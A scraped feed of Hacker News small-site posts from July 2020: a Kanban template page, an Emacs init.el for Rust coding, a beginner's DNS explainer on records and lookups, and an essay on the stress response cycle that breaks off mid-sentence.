      <p><img data-src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f00747bc56ace3ec38665cc/1593954088045/To+Do+Kanban.png" data-image="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f00747bc56ace3ec38665cc/1593954088045/To+Do+Kanban.png" data-image-dimensions="2500x1438" data-image-focal-point="0.5,0.5" alt="To-Do Kanban" data-load="false" src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f00747bc56ace3ec38665cc/1593954088045/To+Do+Kanban.png">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              <!-- Title -->
              <div>
                <p><a href="https://docs.google.com/spreadsheets/d/1mvsCTgGzEu5HSGQrXOh53zaYPFIa9u5bq07JOMb006M/edit?usp=sharing">To-Do Kanban</a></p></div>
            

            <!-- Metadata (Below Title) -->
            <div>
            
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              
            

            
              
              <!-- Excerpt -->
                <p>Keep on top of your progress with this simple Kanban template</p>
              

              

              
            

            <!-- Metadata (Below Content) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

    </div> <!-- End .summary-item-list -->

  </div> <!-- End .summary-item-list-container -->

</div>
</div></div><div data-block-type="51" id="block-yui_3_17_2_1_1593954713804_5334"><div>


<div>
  <form data-form-id="5f01d2a438f0572cba9a6a03" autocomplete="on" method="POST" onsubmit="return (function (form) {
    Y.use('squarespace-form-submit', 'node', function usingFormSubmit(Y) {
      (new Y.Squarespace.FormSubmit(form)).submit({
        formId: '5f01d2a438f0572cba9a6a03',
        collectionId: '5f0081cc65a3745ddd2e2980',
        objectName: 'item-5f00cb5c894f6b087dccdc0d'
      });
    });
    return false;
  })(this);">
    <header>
      <h2>Never miss a template:</h2>
      <p>New templates sent to your inbox every week</p>
    </header>
    <div>
      <div>
        
        
          
            <p><label for="email-yui_3_17_2_1_1593954713804_5339-field">Email Address</label>
              
            </p>
          
        
          
        
      </div>
      
      
        
        
      
    </div>
    <div><p><strong>Please note: </strong>By submitting you email address you hereby accept and consent to our <a href="https://slidegame.io/terms-of-use">Terms of Use Policy</a>, <a href="https://slidegame.io/privacy-policy">Privacy Policy</a> and <a href="https://slidegame.io/acceptable-use-policy">Acceptable Use Policy</a></p></div>
    <p>Thank you!</p>
    
  </form>
</div>
</div></div></div></div></div></div>

        

        
        
          <div data-content-field="author">
            <p><a href="https://slidegame.io/templates?author=5ee5fe816458d8282c591aa9">
  
    <span data-tweaks="tweak-show-blog-item-author-profile">
      <img data-controller="AuthorProfileImageLoader" data-src="https://static1.squarespace.com/static/images/5ee5fe8198b8c739edac6a9d" data-image="https://static1.squarespace.com/static/images/5ee5fe8198b8c739edac6a9d" data-load="false" alt="">
    </span>
  
  <span>Undercover Consultant</span>
</a>



          </p></div>
        
      </div>

      <section>
        <div>
          
        </div>
      </section>
    </div>
  
</article>

</div>
    </div>
  </div>
</section>

  
</article></div>]]>
            </description>
            <link>https://slidegame.io/templates/productivity</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738963</guid>
            <pubDate>Sun, 05 Jul 2020 14:34:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: “Watch” any subreddit. Fetches videos from any subreddit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738962">thread link</a>) | @paashabhai
<br/>
July 5, 2020 | https://arbazsiddiqui.github.io/rSlashVideos/ | <a href="https://web.archive.org/web/*/https://arbazsiddiqui.github.io/rSlashVideos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://arbazsiddiqui.github.io/rSlashVideos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738962</guid>
            <pubDate>Sun, 05 Jul 2020 14:34:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prepare Emacs to Code in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738932">thread link</a>) | @frag
<br/>
July 5, 2020 | https://codingossip.github.io/2020/prepare-emacs-to-code-in-rust/ | <a href="https://web.archive.org/web/*/https://codingossip.github.io/2020/prepare-emacs-to-code-in-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Configuring Emacs as an IDE is not really a piece of cake, especially when “good” is not enough. When it comes to programming in Rust I personally enjoy IDEs like Visual Studio Code (the debugging scripts are really powerful). However the versatility of Emacs is unbeatable, especially in those situations in which one doesn’t really want to use different applications and wants to build a camp in one of them and stay there forever :) Since I am one of those people, I put together a configuration that would definitely make my life easier when I code in Rust or simply edit some text.</p> <p>Feel free to copy and share the <code>init.el</code> below (this goes under <code>~/.emacs.d/</code>)</p> <div><div><pre><code>(require 'package)
(add-to-list 'package-archives
         '("melpa" . "http://melpa.org/packages/") t)

(package-initialize)

;; yup this is for a f'ing copy&amp;paste
(setq x-select-enable-clipboard t)

(when (not package-archive-contents)
    (package-refresh-contents))

(unless (package-installed-p 'use-package)
  (package-install 'use-package))

(require 'use-package)

;; Rust stuff
(require 'rust-mode)
(add-hook 'rust-mode-hook
          (lambda () (setq indent-tabs-mode nil)))
(setq rust-format-on-save t)
(define-key rust-mode-map (kbd "C-c C-c") 'rust-run)
(add-hook 'rust-mode-hook 'cargo-minor-mode)

(add-hook 'rust-mode-hook
          (lambda ()
            (local-set-key (kbd "C-c &lt;tab&gt;") #'rust-format-buffer)))

(require 'company)
(require 'racer)
(require 'rust-mode)
(require 'electric)
(require 'eldoc)
(require 'flycheck)
(require 'flycheck-rust)

(add-to-list 'auto-mode-alist '("\\.rs\\'" . rust-mode))
(add-hook 'rust-mode-hook  #'company-mode)
(add-hook 'rust-mode-hook  #'racer-mode)
(add-hook 'racer-mode-hook #'company-mode)
(add-hook 'racer-mode-hook #'eldoc-mode)
(add-hook 'flycheck-mode-hook #'flycheck-rust-setup)

(define-key rust-mode-map (kbd "TAB") #'company-indent-or-complete-common)
(setq company-tooltip-align-annotations t)

;;(add-hook 'rust-mode-hook
;;          '(lambda ()
;;             (setq racer-cmd (concat (getenv "HOME") "/.cargo/bin/racer"))
;;             (setq racer-rust-src-path (concat (getenv "HOME") "/.rust-dev/rust/src"))
;;             (local-set-key (kbd "TAB") #'company-indent-or-complete-common)
;;             (electric-pair-mode 1)))
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



(setq use-package-always-ensure t)

(add-to-list 'load-path "~/.emacs.d/custom")

(require 'setup-general)

(if (version&lt; emacs-version "24.4")
    (require 'setup-ivy-counsel)
  (require 'setup-helm)
  (require 'setup-helm-gtags))
;; (require 'setup-ggtags)
(require 'setup-cedet)
(require 'setup-editing)

;; (require-package 'atom-one-dark-theme)
;; (require-package 'golden-ratio)
;; (require 'golden-ratio)


;; function-args
;; (require 'function-args)
;; (fa-config-default)
;; (define-key c-mode-map  [(tab)] 'company-complete)
;; (define-key c++-mode-map  [(tab)] 'company-complete)
(custom-set-variables
 ;; custom-set-variables was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 '(package-selected-packages
   (quote
    (vscode-icon dired-explorer dired-sidebar racer projectile-codesearch smex flycheck-rust cargo rust-mode zygospore helm-gtags helm yasnippet ws-butler volatile-highlights use-package undo-tree iedit dtrt-indent counsel-projectile company clean-aindent-mode anzu))))
(custom-set-faces
 ;; custom-set-faces was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 )


;; UI stuff
;; Set initial frame size and position
(defun my/set-initial-frame ()
  (let* ((base-factor 0.70)
         (a-width (* (display-pixel-width) base-factor))
         (a-height (* (display-pixel-height) base-factor))
         (a-left (truncate (/ (- (display-pixel-width) a-width) 2)))
         (a-top (truncate (/ (- (display-pixel-height) a-height) 2))))
    (set-frame-position (selected-frame) a-left a-top)
    (set-frame-size (selected-frame) (truncate a-width)  (truncate a-height) t)))
(setq frame-resize-pixelwise t)
(my/set-initial-frame)

;; (load-theme 'atom-one-dark t)
(blink-cursor-mode 0)
(setq-default cursor-type 'bar)
(set-cursor-color "#cccccc")
(setq ring-bell-function 'ignore)
(golden-ratio-mode 1)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Editing stuff
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
(require 'saveplace)
;; (require-package 'rainbow-mode)
(require 'flycheck)

;; Highlights matching parenthesis
(show-paren-mode 1)

;; Highlight current line
(global-hl-line-mode 1)

;; Interactive search key bindings. By default, C-s runs
;; isearch-forward, so this swaps the bindings.
(global-set-key (kbd "C-s") 'isearch-forward-regexp)
(global-set-key (kbd "C-r") 'isearch-backward-regexp)
(global-set-key (kbd "C-M-s") 'isearch-forward)
(global-set-key (kbd "C-M-r") 'isearch-backward)
(define-key global-map (kbd "RET") 'newline-and-indent)

(add-hook 'after-init-hook #'global-flycheck-mode)

;; When you visit a file, point goes to the last place where it
;; was when you previously visited the same file.
;; http://www.emacswiki.org/emacs/SavePlace

(setq-default save-place t)
;; keep track of saved places in ~/.emacs.d/places
(setq save-place-file (concat user-emacs-directory "places"))

;; Emacs can automatically create backup files. This tells Emacs to
;; put all backups in ~/.emacs.d/backups. More info:
;; http://www.gnu.org/software/emacs/manual/html_node/elisp/Backup-Files.html
(setq backup-directory-alist `(("." . ,(concat user-emacs-directory
                                               "backups"))))
(setq auto-save-default nil)

(defun toggle-comment-on-line ()
  "Comment or uncomment current line."
  (interactive)
  (comment-or-uncomment-region (line-beginning-position) (line-end-position)))
(global-set-key (kbd "C-;") 'toggle-comment-on-line)

;; (add-hook 'prog-mode-hook #'rainbow-delimiters-mode)


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Navigation
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
(require 'ido)
(require 'recentf)
;; (require-package 'ido-ubiquitous)
;; (require-package 'smex)
;; (require-package 'projectile)

(setq recentf-save-file (concat user-emacs-directory ".recentf"))
(recentf-mode 1)
(setq recentf-max-menu-items 40)

;; (ido-mode t)
;; (setq ido-enable-flex-matching t)
;; (setq ido-use-filename-at-point nil)
;; (setq ido-auto-merge-work-directories-length -1)
;; (setq ido-use-virtual-buffers t)

;; (ido-ubiquitous-mode 1)

;; Shows a list of buffers
(global-set-key (kbd "C-x C-b") 'ibuffer)


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Sidebar stuff
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
(use-package vscode-icon)

(use-package dired-sidebar
  :ensure t
  :demand t
  :custom
  (dired-sidebar-theme 'vscode)
  :commands (dired-sidebar-toggle-sidebar))

(add-to-list 'load-path "/home/frag/.emacs.d/dired-sidebar")
(require 'dired-sidebar)
(dired-sidebar-toggle-sidebar)

(setq dired-sidebar-subtree-line-prefix "__")
(setq dired-sidebar-theme 'vscode)
(setq dired-sidebar-use-term-integration t)
(setq dired-sidebar-use-custom-font t)
</code></pre></div></div> </div> </article>  </div></div>]]>
            </description>
            <link>https://codingossip.github.io/2020/prepare-emacs-to-code-in-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738932</guid>
            <pubDate>Sun, 05 Jul 2020 14:29:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DNS Resolution and Records for Developers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23738908">thread link</a>) | @paashabhai
<br/>
July 5, 2020 | https://www.arbazsiddiqui.me/dns-resolution-and-records-for-developers/ | <a href="https://web.archive.org/web/*/https://www.arbazsiddiqui.me/dns-resolution-and-records-for-developers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><h2 id="introduction"><a href="#introduction" aria-label="introduction permalink"></a>Introduction</h2>
<p>Domain Name System (DNS) is something which we all use everyday without knowing the internal workings of it. How does a url we enter in our browser gets redirected to a specific server? How is it so fast? If you have setup any website you might be familiar with adding A record and CNAMEs. But what are they? What <code>@</code> as a host means? When to use what? This article try to answer all these questions. We will cover what DNS is, how does it work, what are different DNS records and their use cases.</p>
<h2 id="what-is-a-domain-name"><a href="#what-is-a-domain-name" aria-label="what is a domain name permalink"></a>What is a Domain Name?</h2>
<p>Lets first understand what a domain name is before we can jump into DNS. A domain name is a unique text identifier for a website or server. The domain name for this website is <code>arbazsiddiqui.me</code>. A domain has following structure :</p>
<div data-language="text"><pre><code>&lt;subdomain&gt;.&lt;domain&gt;.&lt;TLD&gt;</code></pre></div>
<p>Lets understand this via an example of <code>blog.arbazsiddiqui.me</code>.</p>
<p><code>.me</code> is the <code>Top Level Domain (TLD)</code>. This is the root of the domain and encompasses all domains in it. <code>.com</code>, <code>.org</code>, <code>.io</code> are all example of TLDs. <code>arbazsiddiqui</code> is the <code>domain</code> and technically a <code>subdomain</code> of <code>.me</code>. <code>blog</code> is a subdomain of <code>arbazsiddiqui</code>. We can chain this as far as we want, only thing to understand here is that <code>TLD</code> is the root and all subsequent domains are <code>subdomains</code> of the previous one.</p>
<h2 id="what-is-dns"><a href="#what-is-dns" aria-label="what is dns permalink"></a>What is DNS?</h2>
<p>The Domain Name System (DNS) is the phonebook of the internet. DNS is the mechanism which is responsible for converting human friendly urls like <code>arbazsiddiqui.me</code> to machine understandable IP addresses (<code>104.198.14.52</code> in this case). Each device connected to the Internet has a unique IP address which other machines use to find the device. DNS eliminate the need for humans to memorize IP addresses. </p>
<h2 id="how-does-dns-work"><a href="#how-does-dns-work" aria-label="how does dns work permalink"></a>How does DNS work?</h2>
<p>The process of finding a host name's IP address is called DNS resolution or DNS lookup. A server queries a bunch of other servers if they have the IP address of requested domain name. The other server might not know the IP of the requested domain but will point it to another server which might know it. After following up this chain we will eventually end up with the IP address of our domain. </p>
<p>A DNS resolution will typically require 4 hops (in a non cached scenario). </p>
<ol>
<li><strong>DNS Resolver</strong> : The DNS resolver is the computer that responds to a request from a client and takes the time to track down the DNS record. It will query all other subsequent servers on your behalf and after finding the IP address will respond with it.</li>
<li><strong>Root nameserver</strong> : This is the first step towards finding the IP of requested domain. A root nameserver has the IP address of TLD nameservers. So if you are requesting <code>example.com</code>, root nameserver will point DNS resolver to the IP address of TLD nameserver for <code>.com</code> and DNS resolver can process from there.</li>
<li><strong>TLD nameserver</strong> : TLD nameservers contain the IP addresses of all the subdomains which are the part of their TLD. So in our case of <code>example.com</code>, the <code>.com</code> TLD (which was pointed to use by <code>root nameserver</code>) will point DNS resolver towards the <code>Authoritative nameserver</code> of <code>example.com</code>. </li>
<li><strong>Authoritative nameserver</strong> : An authoritative DNS server is a server that actually holds, and is responsible for, DNS resource records. This is the server at the bottom of the DNS lookup chain that will respond with the queried resource record, ultimately allowing the web browser making the request to reach the IP address needed to access a website or other web resources. In our case, it will respond back with IP address <code>104.198.14.52</code> to the DNS resolver which will respond the same back to client. This marks the complete chain of a DNS lookup.</li>
</ol>
<p><span>
      <a href="https://www.arbazsiddiqui.me/static/db3c8c0870e1e9acf669cafbadc8ce69/f84cf/DNS-Lookup.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="DNS Lookup" title="DNS Lookup" src="https://d33wubrfki0l68.cloudfront.net/1a64d403b736a3ca4484b7d01be2af97595c2cd4/6cb51/static/db3c8c0870e1e9acf669cafbadc8ce69/faddd/dns-lookup.jpg" srcset="https://d33wubrfki0l68.cloudfront.net/bfa0948e86d586451ef4ba90b9b704006e942c03/c7c72/static/db3c8c0870e1e9acf669cafbadc8ce69/6a7c0/dns-lookup.jpg 213w,
https://d33wubrfki0l68.cloudfront.net/30ce1c0983d3fb89cf61182b8504c2353b1fef28/67f56/static/db3c8c0870e1e9acf669cafbadc8ce69/b9721/dns-lookup.jpg 425w,
https://d33wubrfki0l68.cloudfront.net/1a64d403b736a3ca4484b7d01be2af97595c2cd4/6cb51/static/db3c8c0870e1e9acf669cafbadc8ce69/faddd/dns-lookup.jpg 850w,
https://d33wubrfki0l68.cloudfront.net/5164b9b355447618c8bdc9481c7e10868993357a/52178/static/db3c8c0870e1e9acf669cafbadc8ce69/f84cf/dns-lookup.jpg 880w" sizes="(max-width: 850px) 100vw, 850px" loading="lazy">
  </a>
    </span></p>
<p>To know the IP address of a domain name you can simple do : </p>
<div data-language="terminal"><pre><code>dig arbazsiddiqui.me +short

104.198.14.52</code></pre></div>
<p><code>104.198.14.52</code> is the IP address of server hosting <code>arbazsiddiqui.me</code>.</p>
<h2 id="dns-records"><a href="#dns-records" aria-label="dns records permalink"></a>DNS Records</h2>
<p>DNS records are instructions that live in authoritative nameservers and provide information about a domain including what IP address is associated with that domain and how to handle requests for that domain. You as website owner are responsible for telling the Authoritative nameserver (the last stop in DNS lookup) the address of the server your website is hosted on. DNS records allows you to do multiple things such as adding subdomains. A record typically consist of three things a <code>Type</code>, a <code>Host</code> and a <code>Value</code>. Lets look at record types one by one.</p>
<h3 id="a-records"><a href="#a-records" aria-label="a records permalink"></a>A records</h3>
<p>An A record maps a domain name to an IPv4 address. It’s what you use to point <code>arbazsiddiqui.me</code> to <code>104.198.14.52</code>.</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Host</th>
<th>Value</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>@</td>
<td>104.198.14.52</td>
<td>14400</td>
</tr>
</tbody>
</table>
<p>The above record means that when someone types <code>arbazsiddiqui.me</code> in the browser, the request will be directed to server on IP <code>104.198.14.52</code>. The <code>@</code> here indicates that this is a record for the root domain, and the ‘14400’ value is the TTL (Time To Live), listed in seconds. This means that if an A record gets updated, it takes 240 minutes (14400 seconds) to take effect.</p>
<blockquote>
<p>Some registrars like goDaddy call Host as Name.</p>
</blockquote>
<p>The <code>AAAA</code> record does the same for IPv6</p>
<h3 id="cname"><a href="#cname" aria-label="cname permalink"></a>CNAME</h3>
<p>A CNAME record is used when a domain or subdomain is an alias of another domain. In other words when you want to add a subdomain like <code>www</code> or <code>blog</code> to
<code>arbazsiddiqui.me</code>. The CNAME record's value is <strong>always</strong> another domain and NOT the IP address. Hence if you want to add a subdomain <code>www</code> to <code>arbazsiddiqui.me</code>, it will look like this : </p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Host</th>
<th>Value</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>CNAME</td>
<td>www</td>
<td>arbazsiddiqui.me</td>
<td>14400</td>
</tr>
</tbody>
</table>
<p>This record states that when <code>www.arbazsiddiqui.me</code> is typed in browser, trigger a lookup for <code>value</code> which in this case is <code>arbazsiddiqui.me</code>. This will eventually serve the A record for <code>arbazsiddiqui.me</code> from above section. So CNAMEs can point to other domains or subdomains but the chain will eventually end up to an A record which will be used to serve website.</p>
<p>CNAME can also be used to point to another app hosted somewhere like heroku or netlify.</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Host</th>
<th>Value</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>CNAME</td>
<td>www</td>
<td>trusting-jennings-f13c44.netlify.com</td>
<td>14400</td>
</tr>
</tbody>
</table>
<h3 id="txt"><a href="#txt" aria-label="txt permalink"></a>TXT</h3>
<p>The text record let’s a domain administrator enter text into the DNS record. It is most commonly used to determine the ownership of the domain. For example to claim a domain on google search console you will have to add a token as TXT record so that google knows that you are the legit owner of your domain. </p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Host</th>
<th>Value</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>TXT</td>
<td>@</td>
<td>google-site-verification=xyz</td>
<td>14400</td>
</tr>
</tbody>
</table>
<h3 id="mx"><a href="#mx" aria-label="mx permalink"></a>MX</h3>
<p>The mail exchange record directs email to a mail server. The value of MX record should be a domain.</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Host</th>
<th>Value</th>
<th>Priority</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>MX</td>
<td>@</td>
<td>mailhost.example.com</td>
<td>3</td>
<td>14400</td>
</tr>
<tr>
<td>MX</td>
<td>@</td>
<td>mailhost2.example.com</td>
<td>4</td>
<td>14400</td>
</tr>
</tbody>
</table>
<p>The new field <code>priority</code> here indicates the the order in which the message will be tried. Here <code>mailhost.example.com</code> will be tried first as it has higher priority and if it fails it will try <code>mailhost2.example.com</code>.</p>
<h2 id="caching"><a href="#caching" aria-label="caching permalink"></a>Caching</h2>
<p>In <a href="#how-does-dns-work">DNS lookup</a> section we saw that a DNS resolution is a 4 hop process, but on a good internet connection things work in a seamless manner. DNS uses UDP protocol which is fast but still doing so many resolution so quickly wont be possible without introducing caching. DNS responses are cached at many different levels. In your browser, in your domestic router, and also in intermediary networking hardware.</p>
<p>And if there’s caching, there’s also a way to expire the cache, and that’s the TTL (time to live). Any DNS record will have an associated TTL value, and that’s how much time their value can be stored (cached) by any involved party. You can change this at any time from the DNS server.</p>
<h2 id="hosts-file"><a href="#hosts-file" aria-label="hosts file permalink"></a>Hosts File</h2>
<p>All OS provides us with a <code>hosts</code> file. We can keep a list of domains and their respective IP addresses here. If a domain is listed here, it will take precedence over the normal DNS lookup flow and the clients will directly try to connect with IP listed against an IP. A line from <code>hosts</code> file looks like this : </p>

<p>Adding the websites you visit the mosts and their respective IPs might seem a good idea and will definitely save you some time spent in resolution but its too much of a hassle to keep this updating if the IP changes or as you get addicted to more websites. For this use case we can use tools like <a href="http://www.thekelleys.org.uk/dnsmasq/doc.html" target="_blank" rel="noopener noreferrer">dnsmasq</a> which is light weight caching server.</p>
<p>However hosts file is great way to check your new server without changing anything publicly, just edit this file and manually set your domain to point to the IP address of your new server, and you’ll be able to test it for real with a browser.</p>
<p>Another great use case of hosts file is to block unwanted sites by adding their domain to loopback IP <code>127.0.0.1</code>. This can be done to block ads, malwares or cure reddit addiction. Just add following lines to your <code>/etc/hosts</code> file: </p>

<h2 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h2>
<p>Its easy to forget the internal workings of internet behind all the cat videos. DNS resolution is one such internal mechanism which makes up the internet and its good to know how it works under the hood. In this article we learned what DNS is and how does a url in browser gets converted to an IP address. We also looked at DNS records and their respective use cases.</p></div></article></div>]]>
            </description>
            <link>https://www.arbazsiddiqui.me/dns-resolution-and-records-for-developers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738908</guid>
            <pubDate>Sun, 05 Jul 2020 14:26:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Stress Response Cycle: The Surprising Science Behind Feeling Better]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738861">thread link</a>) | @coffeeandjunk
<br/>
July 5, 2020 | https://coffeeandjunk.com/stress-response-cycle/ | <a href="https://web.archive.org/web/*/https://coffeeandjunk.com/stress-response-cycle/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <!-- 
            <figure class="post-full-image">
                <img
                    srcset="/content/images/size/w300/2020/07/stress-response-cycle.jpg 300w,
                            /content/images/size/w600/2020/07/stress-response-cycle.jpg 600w,
                            /content/images/size/w1000/2020/07/stress-response-cycle.jpg 1000w,
                            /content/images/size/w2000/2020/07/stress-response-cycle.jpg 2000w"
                    sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px"
                    src="/content/images/size/w2000/2020/07/stress-response-cycle.jpg"
                    alt="The Stress Response Cycle: The Surprising Science Behind Feeling Better"
                />
            </figure>
             -->

            <section>
                <div>
                    <p>The internet is littered with infinite content on managing stress. Most of them don’t know what they are talking about. The basic premise is always to “learn to chill”. But if it were so simple, there wouldn’t have been so many motivational videos and blog posts in the first place.</p><p>Stress is a physiological phenomenon, and unless we understand the science behind it, we cannot possibly know how to manage it. In her phenomenal book, <a href="https://amzn.to/31Kh4S5"><em>Come As You Are</em></a>, sex educator Emily Nagoski talks about the physiology of stress, and gives us important pointers to deal with it.</p><p>Let’s start by separating <em>stressors</em> from <em>stress</em>. Your stressors are the things that activate the stress response. For example, exams, bills, family, office, fretting about your career, all of that.</p><p>Your stress is the system of changes activated in your brain and body in response to those stressors. We refer stress as the fight-or-flight response, but its full description is: fight, flight, or freeze response. Stress is an evolutionarily adaptive mechanism that allows you to respond to perceived threats, such as being chased by a lion.</p><p>These days we are not chased by lions, and yet our body’s response to threats such as an incompetent boss is largely the same as it would be to a lion. Our primitive brain doesn’t differentiate much.</p><p>When your brain perceives a threat, you experience a massive biochemical and physiological change. Your bloodstream is flooded by adrenaline and cortisol. Your heart rate, respiration rate and blood pressure increases. Your immune and digestive functioning gets suppressed. Your pupils are dilated thereby shifting you into a vigilant and battle-ready state. You body prepares itself for the action to come.</p><p>What the “action” will be depends on the nature of the perceived threat. If it’s a lion, your brain informs you it’s the kind of threat that you are most likely to survive by trying to escape—flight. If the lion doesn’t get hold of you, you reach your village safely, and rejoice in relief.</p><p>There are times when your brain decides that you can best survive a threat by conquering—fight. You jump on the thief who tries to run off with your wallet.</p><p>This is the stress response cycle. It starts with a stressor (when your brain screams, I’m at risk), action (fight or flight), and relief (I’m safe). These two responses—fight and flight—are both accelerator stress response—the “GO!”</p><p>But suppose a stressor is such that your brain determines that you can neither survive it by escaping nor by conquering. The lion has already grabbed you, you don’t have any weapons to attack, and it’s too late to run. Your body has undergone a series of changes to prepare itself to deal with the threat, but this time you get the brakes stress response—the freeze—the “STOP!” instead of the “GO!” Your body shuts down. You can’t move, or can move only sluggishly. You senses slow down and you become dizzy. You surrender!</p><p>Animals in the wild play possum as a last-ditch effort to convince a predator that they’re already dead. Surrender also facilitates a painless death. But if an animal survives such an intense threat to its life, it shakes before getting up. It trembles. Its paws vibrate. It heaves a great big sigh. And then it gets up, shakes itself off before trotting away.</p><p>What’s happening here is that freeze has interrupted the “GO!” stress response of fight or flight, leaving all that adrenaline to go stale inside the animal’s body. When the animal shakes and shudders and sighs, its body releases the brake, completes the process triggered by fight/flight, and purges the residue, thereby completing the cycle.</p><p>My girlfriend underwent surgery a couple of years back. After coming out of anaesthesia, she started screaming and yelling with any obvious cause. Emily Nagoski calls it “the Feels”. Anaesthesia is medically induced freeze. She wasn’t in any danger, but she had a lot of Feels that needed to work themselves out in order to complete the cycle. Only rarely in our everyday lives does unlocking from freeze take such a dramatic form, but even in its smaller scale, that’s how the stress response cycle works, beginning, middle, and end—all innately built into the nervous system. The cycle needs to complete in order to relieve stress.</p><p>It sounds very simple, and it is. But stress is more complex in us humans due to modernity and other cultural reasons. For starters, modern stressors are lower in intensity and longer in duration—<em>chronic stressors</em>, in contrast to <em>acute stressors</em> like being chased by a lion.</p><p>Acute stressors have a clear beginning, middle, and end. Completing the cycle—running, surviving, celebrating—is inherently built in. It’s not so with chronic stressors. If our stress is chronic and we don’t take deliberate steps to complete the cycle, all that activated stress just hangs out inside us, making us sick, tired, and unable to experience pleasure in anything.</p><p>On top of that, our emotion-dismissing culture is uncomfortable with the Feels. As a result, most people’s idea of stress management is some version of “just relax” as if stress can be turned off like a light switch.</p><p>But most importantly, our ultrasocial human brains are really good at self-inhibition, stopping the stress response mid-cycle because “now is not an appropriate time for the Feels”—especially if you are in a public pace. We use this self-inhibition in order to facilitate social cooperation. We don’t want to freak anybody out, do we?</p><p>But unfortunately, our culture has eliminated all appropriate times for Feels. We’ve locked ourselves, culturally, into our own fear, rage, and despair. Hence most people resort to doing things that distract them from stress, such as alcohol, endless partying, binging on fast-food and Netflix. They’re all intended to do one thing: manage the underlying feelings. But it can be done in a healthy way as well. We just have to build time, space, and strategies for discharging our stress response cycles. That is the only way to deal with stress.</p><p>Think about what your body recognises as the behaviours that save you from lions. When you’re being chased by a lion, what do you do? You run. So when you’re stressed out by your job, what do you do? You run…or walk, or get on a bicycle, or go out dancing.</p><p>Physical activity is the single most efficient strategy to complete the stress response cycle, and recalibrate your central nervous system into a calm state. When people say, “Exercise is good for stress,” that is for real.</p><p>Alan Turing famously ran miles everyday to relieve stress. When asked why he does that he said, “I have such a stressful job that the only way I can get it out of my mind is by running hard; it’s the only way I can get some release.”</p><p>In his 